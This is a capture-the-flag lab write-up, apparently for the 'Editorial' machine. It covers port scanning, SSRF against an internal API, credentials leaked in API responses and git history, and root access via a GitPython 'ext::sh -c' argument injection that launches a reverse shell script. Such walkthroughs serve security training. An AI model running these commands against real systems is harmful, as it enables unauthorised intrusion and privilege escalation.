![image](https://github.com/user-attachments/assets/c76baffe-1f65-4fc6-a4a7-8e0f3fa00980)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

### Port scan:

I began my enumeration with a port and service scan using `rustscan`, which revealed only two open ports:

```sh
rustscan -a 10.10.11.20 -- -A -T4 -vv -oN editorial_nmap
```

```rs
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 5.0 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=7/28%OT=22%CT=%CU=38586%PV=Y%DS=2%DC=T%G=N%TM=66A60AC1%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 30.214 days (since Fri Jun 28 00:01:28 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   177.20 ms 10.10.14.1
2   177.28 ms 10.10.11.20
```

From the port scan results, I observed that port 80 redirects to the domain `http://editorial.htb`. I added this domain to my hosts file.

### Web enumeration:

Browsing through the website, it appears to be related to book publishing and editing:

![image](https://github.com/user-attachments/assets/83dcee08-e045-42a6-ba7b-818e71368e5d)

Next, I performed directory fuzzing using dirsearch and found two directories:

```
dirsearch -u http://editorial.htb -x 404,403 --crawl
```

- about
- upload

![image](https://github.com/user-attachments/assets/90466cca-78ce-4b67-aec2-1c1953f35a8f)

Browsing to the uploads page revealed an option to upload a book for publication:

![image](https://github.com/user-attachments/assets/d83c9277-3f61-467b-969f-2e43d617c67e)

I started a local HTTP server on my Kali host and tried to perform a preview from the web application. I observed that I was receiving the requests:

![image](https://github.com/user-attachments/assets/932c178f-1c0e-4ed3-8341-095d12a1e8e4)

Next, I tried to upload a PHP-based web shell to access it directly from the target website, but that didn't work. The application was fetching the file but not saving it. 😕

![image](https://github.com/user-attachments/assets/65c19576-e149-4ac2-87bb-afa8be718d43)

![image](https://github.com/user-attachments/assets/a816e72f-d75e-4b99-b152-3ac773d450b3)

Next, I thought of checking the target's localhost IP, and it responded with some JPEG file:

![image](https://github.com/user-attachments/assets/40c970f1-70e6-4130-8d7e-5c425e817fda)

![image](https://github.com/user-attachments/assets/b24d5ab8-3752-44e2-b179-ff075065be71)

Although the image was blank, it seemed like there was something running on the localhost, possibly on another port. This smells like an SSRF vulnerability.

### SSRF:

I sent the request to Burp Intruder to check the response on each port up to 10000 (I didn't go up to 65K since I didn't have the Burp Pro version).

![image](https://github.com/user-attachments/assets/7cd24403-f33d-49b2-a8c0-68f9a7c88c76)

After a few hours of running the intruder, I got a unique response on port 5000:

![image](https://github.com/user-attachments/assets/71e0254c-7a66-4585-814f-8a360607a734)

![image](https://github.com/user-attachments/assets/c3c1c6b7-37f2-44af-866a-320dd9f40272)

This response revealed some API endpoints.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access:

While going through the API endpoints one by one, I found a response that contained credentials belonging to the `dev` user:

![image](https://github.com/user-attachments/assets/9f91b29d-be22-411a-b199-3262816d1bbd)

![image](https://github.com/user-attachments/assets/cc0f6775-57d2-46bb-aee6-e5deddf68516)

Using these credentials, I was finally able to log in with `dev's` account and gained initial access:

![image](https://github.com/user-attachments/assets/9d774b4a-d426-4827-bbb3-f35ad9a22d44)

I also found the user flag in dev's home directory. 🙂

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Privilege escalation:

### Git enumeration:

After gaining initial access, I started looking for ways to escalate my privileges. When I checked the sudo privileges, I wasn't allowed to run any command with sudo privileges:

![image](https://github.com/user-attachments/assets/bd06789f-8d85-4799-a456-044e4cfd3990)

While searching for other vectors, I found a `.git` folder:

![image](https://github.com/user-attachments/assets/ccf0cba8-66b1-4789-90ee-6d16b0d5fcdc)

I navigated into the directory and started analyzing the logs:

```
git log
```
![image](https://github.com/user-attachments/assets/eded5a7c-16d1-41af-b9e5-31c01817e060)

I found multiple commits and analyzed them one by one:

```
git show <commit>
```

In one of the commits, I found another user, `prod`, and their credentials:

![image](https://github.com/user-attachments/assets/3b0d37dd-2700-496e-a4bd-cc78e2f37fcd)

![image](https://github.com/user-attachments/assets/08e264a9-5864-492c-8990-483968d6590c)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Root.txt:

I switched to the `prod` user and checked for sudo privileges again:

![image](https://github.com/user-attachments/assets/2692b05a-6f0b-48e6-9fd9-f44dad0136d4)

```
sudo -l
```

I found that I could run the following command with sudo privileges:

![image](https://github.com/user-attachments/assets/80b70deb-5100-4d46-858b-29467a748860)

Examining the `clone_prod_change.py` script, I noticed it imports `Repo` from `git`, indicating it's using `GitPython`. Searching for "from git import Repo exploit," I found a Remote Code Execution (RCE) vulnerability associated with it:ike a `GitPython` & when I searched with "from git import Repo exploit" I observed there is a RCE associated with it:

```
https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
https://github.com/gitpython-developers/GitPython/issues/1515
```

![image](https://github.com/user-attachments/assets/03edb842-8042-4d74-9d7c-bbdd0cf70b93)

Reviewing the GitHub issue, it appeared I could run arbitrary commands:

![image](https://github.com/user-attachments/assets/cae18c12-e11a-46ee-9583-23f576047035)

I created a bash reverse shell script and saved it in `/tmp/shell.sh`. After starting my `netcat` listener, I executed the script:

```
sudo -u root /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c /tmp/shell.sh'
```

After executing the script, I immediately got a shell as the root user:🙂

![image](https://github.com/user-attachments/assets/e7abc475-8ae7-4ffe-a764-6c0aba9d5f0d)

I also retrieved the root flag. (pwn3d!🎉)

![image](https://github.com/user-attachments/assets/fb0f62f5-fa0d-4802-abff-8c97aa956697)

